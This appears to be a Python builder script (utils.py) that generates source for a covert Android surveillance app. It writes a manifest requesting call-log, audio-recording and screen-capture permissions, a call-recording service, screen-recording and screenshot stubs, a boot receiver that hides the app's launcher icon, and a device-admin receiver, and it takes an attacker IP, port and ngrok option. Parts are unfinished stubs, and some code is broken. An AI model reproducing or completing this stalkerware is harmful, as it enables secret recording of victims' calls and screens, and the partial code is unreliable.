# Part 1: Start of utils.py

import os
import subprocess
import socket

def stdOutput(type):
    if type == "info":
        return "[INFO] "
    elif type == "error":
        return "[ERROR] "
    elif type == "success":
        return "[SUCCESS] "
    return ""

def clearDirec():
    files = ['path/to/AndroidManifest.xml', 'MainActivity.java', 'CallRecordingService.java', 'ScreenRecordingService.java', 'ScreenshotService.java', 'HideApkReceiver.java', 'MyDeviceAdminReceiver.java']
    for file in files:
        if os.path.exists(file):
            os.remove(file)

def build(ip, port, output, use_ngrok, port_, icon):
    create_manifest(ip, port, use_ngrok)
    create_main_activity()
    create_call_recording_service()
    create_screen_recording_service()
    create_screenshot_service()
    create_hide_apk_receiver()
    create_device_admin_receiver()
    add_permissions()
    # Other build processes like compiling the APK
    print(stdOutput("success") + "APK built successfully!")

# Part 1: End of utils.py
# Part 2: Start of utils.py

def add_permissions():
    permissions = [
        'android.permission.INTERNET',
        'android.permission.RECORD_AUDIO',
        'android.permission.READ_PHONE_STATE',
        'android.permission.PROCESS_OUTGOING_CALLS',
        'android.permission.READ_CALL_LOG',
        'android.permission.WRITE_CALL_LOG',
        'android.permission.SYSTEM_ALERT_WINDOW',
        'android.permission.WRITE_EXTERNAL_STORAGE',
        'android.permission.READ_EXTERNAL_STORAGE',
        'android.permission.CAPTURE_VIDEO_OUTPUT',
        'android.permission.CAPTURE_SECURE_VIDEO_OUTPUT'
    ]
    manifest_path = 'path/to/AndroidManifest.xml'
    with open(manifest_path, 'a') as manifest_file:
        for permission in permissions:
            manifest_file.write(f'<uses-permission android:name="{permission}" />\n')

def create_manifest(ip, port, use_ngrok):
    manifest_code = f"""
    <manifest xmlns:android="http://schemas.android.com/apk/res/android"
        package="com.example.myapp">

        <application
            android:allowBackup="true"
            android:icon="@mipmap/ic_launcher"
            android:label="@string/app_name"
            android:roundIcon="@mipmap/ic_launcher_round"
            android:supportsRtl="true"
            android:theme="@style/AppTheme">
            <activity android:name=".MainActivity">
                <intent-filter>
                    <action android:name="android.intent.action.MAIN" />
                    <category android:name="android.intent.category.LAUNCHER" />
                </intent-filter>
            </activity>
            <service android:name=".CallRecordingService"/>
            <service android:name=".ScreenRecordingService"/>
            <service android:name=".ScreenshotService"/>
            <receiver android:name=".HideApkReceiver">
                <intent-filter>
                    <action android:name="android.intent.action.BOOT_COMPLETED" />
                    <category android:name="android.intent.category.DEFAULT" />
                </intent-filter>
            </receiver>
            <receiver android:name=".MyDeviceAdminReceiver"
                android:permission="android.permission.BIND_DEVICE_ADMIN">
                <meta-data
                    android:name="android.app.device_admin"
                    android:resource="@xml/device_admin_receiver" />
                <intent-filter>
                    <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
                </intent-filter>
            </receiver>
        </application>

        <uses-sdk android:minSdkVersion="16" android:targetSdkVersion="28" />
    </manifest>
    """
    manifest_path = 'path/to/AndroidManifest.xml'
    with open(manifest_path, 'w') as manifest_file:
        manifest_file.write(manifest_code)

# Part 2: End of utils.py
# Part 3: Start of utils.py

def create_main_activity():
    activity_code = """
    package com.example.myapp;

    import android.os.Bundle;
    import android.support.v7.app.AppCompatActivity;

    public class MainActivity extends AppCompatActivity {
        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_main);
        }
    }
    """
    activity_path = 'MainActivity.java'
    with open(activity_path, 'w') as activity_file:
        activity_file.write(activity_code)

def create_call_recording_service():
    service_code = """
    package com.example.myapp;

    import android.app.Service;
    import android.content.Intent;
    import android.media.MediaRecorder;
    import android.os.IBinder;
    import java.io.IOException;

    public class CallRecordingService extends Service {
        private MediaRecorder mediaRecorder;

        @Override
        public IBinder onBind(Intent intent) {
            return null;
        }

        @Override
        public void onStart(Intent intent, int startId) {
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(getFilesDir() + "/call_recording.3gp");
            try {
                mediaRecorder.prepare();
                mediaRecorder.start();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        @Override
        public void onDestroy() {
            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
        }
    }
    """
    service_path = 'CallRecordingService.java'
    with open(service_path, 'w') as service_file:
        service_file.write(service_code)

# Part 3: End of utils.py
# Part 4: Start of utils.py

def create_screen_recording_service():
    service_code = """
    package com.example.myapp;

    import android.app.Service;
    import android.content.Intent;
    import android.media.projection.MediaProjectionManager;
    import android.os.IBinder;

    public class ScreenRecordingService extends Service {
        @Override
        public IBinder onBind(Intent intent) {
            return null;
        }

        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            // Implement screen recording functionality here
            return START_STICKY;
        }
    }
    """
    service_path = 'ScreenRecordingService.java'
    with open(service_path, 'w') as service_file:
        service_file.write(service_code)

def create_screenshot_service():
    service_code = """
    package com.example.myapp;

    import android.app.Service;
    import android.content.Intent;
    import android.graphics.Bitmap;
    import android.graphics.PixelFormat;
    import android.media.projection.MediaProjectionManager;
    import android.os.IBinder;
    import android.view.Display;
    import android.view.WindowManager;

    public class ScreenshotService extends Service {
        @Override
        public IBinder onBind(Intent intent) {
            return null;
        }

        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
            Display display = windowManager.getDefaultDisplay();
            // Implement screenshot functionality here
            return START_STICKY;
        }
    }
    """
    service_path = 'ScreenshotService.java'
    with open(service_path, 'w') as service_file:
        service_file.write(service_code)

# Part 4: End of utils.py
# Part 5: Start of utils.py

def create_hide_apk_receiver():
    receiver_code = """
    package com.example.myapp;

    import android.content.BroadcastReceiver;
    import android.content.Context;
    import android.content.Intent;
    import android.content.pm.PackageManager;

    public class HideApkReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            PackageManager packageManager = context.getPackageManager();
            packageManager.setComponentEnabledSetting(
                    new ComponentName(context, com.example.myapp.MainActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
            );
        }
    }
    """
    receiver_path = 'HideApkReceiver.java'
    with open(receiver_path, 'w') as receiver_file:
        receiver_file.write(receiver_code)

def create_device_admin_receiver():
    receiver_code = """
    package com.example.myapp;

    import android.app.admin.DeviceAdminReceiver;
    import android.content.Context;
    import android.content.Intent;

    public class MyDeviceAdminReceiver extends DeviceAdminReceiver {
        @Override
        public void onEnabled(Context context, Intent intent) {
            super.onEnabled(context, intent);
        }

        @Override
        public void onDisabled(Context context, Intent intent) {
            super.onDisabled(context, intent);
        }
    }
    """
    receiver_path = 'MyDeviceAdminReceiver.java'
    with open(receiver_path, 'w') as receiver_file:
        receiver_file.write(receiver_code)

# Part 5: End of utils.py
